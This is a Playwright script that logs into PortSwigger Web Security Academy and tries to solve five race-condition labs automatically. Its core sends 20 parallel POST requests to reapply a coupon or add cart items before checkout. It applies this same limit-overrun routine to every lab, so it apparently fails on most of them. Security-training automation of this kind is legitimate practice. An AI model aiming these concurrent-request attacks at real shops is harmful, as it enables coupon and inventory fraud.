const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

async function launchLab(ctx, page, labPath) {
  await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
  await page.fill('#EmailAddress', EMAIL);
  await page.fill('#Password', PASSWORD);
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.click('#Login'),
  ]);
  await page.waitForTimeout(2000);

  await page.goto(`https://portswigger.net${labPath}`, { waitUntil: 'networkidle', timeout: 30000 });
  await page.waitForTimeout(2000);
  
  const [newPage] = await Promise.all([
    ctx.waitForEvent('page', { timeout: 15000 }),
    page.click('text=ACCESS THE LAB'),
  ]);
  await newPage.waitForLoadState('networkidle', { timeout: 15000 });
  await newPage.waitForTimeout(3000);
  
  return newPage;
}

async function isSolved(page) {
  await page.goto(page.url(), { waitUntil: 'networkidle', timeout: 15000 });
  await page.waitForTimeout(2000);
  const body = await page.content();
  return body.toLowerCase().includes('congratulations');
}

async function solveRace1(page) {
  // Limit overrun - typically: apply coupon multiple times simultaneously
  // or add multiple items with limited stock
  
  // First, log in if needed
  const loginLink = await page.locator('text=Login').first();
  if (await loginLink.count() > 0) {
    await loginLink.click();
    await page.waitForTimeout(2000);
    await page.fill('input[name="username"]', 'wiener');
    await page.fill('input[name="password"]', 'peter');
    await page.click('button:has-text("Login")');
    await page.waitForTimeout(3000);
  }
  
  // Look for coupon/gift card application
  const couponInput = await page.locator('input[name="coupon"], input[placeholder*="coupon" i]').first();
  if (await couponInput.count() > 0) {
    // Apply coupon multiple times simultaneously using fetch
    const base = new URL(page.url()).origin;
    
    // Get CSRF token
    const csrf = await page.locator('input[name="csrf"]').first().inputValue().catch(() => '');
    
    // Send 20 simultaneous requests
    const promises = [];
    for (let i = 0; i < 20; i++) {
      promises.push(page.evaluate((base, csrf) => {
        return fetch(`${base}/cart/coupon`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `coupon=_SIGNUP&csrf=${csrf}`,
        }).then(r => r.text()).catch(e => e.message);
      }, base, csrf));
    }
    await Promise.all(promises);
    await page.waitForTimeout(2000);
  }
  
  // Try adding to cart multiple times
  const addToCart = await page.locator('button:has-text("Add to cart")').first();
  if (await addToCart.count() > 0) {
    const base = new URL(page.url()).origin;
    const csrf = await page.locator('input[name="csrf"]').first().inputValue().catch(() => '');
    
    const promises = [];
    for (let i = 0; i < 20; i++) {
      promises.push(page.evaluate((base, csrf) => {
        return fetch(`${base}/cart`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `productId=1&quantity=1&redir=PRODUCT&csrf=${csrf}`,
        }).then(r => r.text()).catch(e => e.message);
      }, base, csrf));
    }
    await Promise.all(promises);
    await page.waitForTimeout(2000);
  }
  
  // Try purchasing
  const checkout = await page.locator('button:has-text("Place order"), a:has-text("Checkout")').first();
  if (await checkout.count() > 0) {
    await checkout.click();
    await page.waitForTimeout(3000);
  }
}

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();

  const races = [
    { num: 1, path: '/web-security/race-conditions/lab-race-conditions-limit-overrun' },
    { num: 2, path: '/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits' },
    { num: 4, path: '/web-security/race-conditions/lab-race-conditions-single-endpoint' },
    { num: 5, path: '/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities' },
    { num: 6, path: '/web-security/race-conditions/lab-race-conditions-partial-construction' },
  ];

  let solved = 0;
  let failed = 0;

  for (const race of races) {
    try {
      console.log(`\n[RaceConditions#${race.num}] Launching...`);
      const labPage = await launchLab(ctx, page, race.path);
      console.log(`  Lab URL: ${labPage.url()}`);
      
      await solveRace1(labPage);
      
      if (await isSolved(labPage)) {
        console.log(`  SOLVED!`);
        solved++;
      } else {
        console.log(`  Not solved`);
        failed++;
      }
    } catch (e) {
      console.log(`  Error: ${e.message?.slice(0, 200)}`);
      failed++;
    }
  }

  console.log(`\n========================================`);
  console.log(`RaceConditions Result: ${solved} solved, ${failed} failed`);
  console.log(`========================================`);

  await ctx.close();
  await browser.close();
}

main().catch(e => { console.error(e); process.exit(1); });
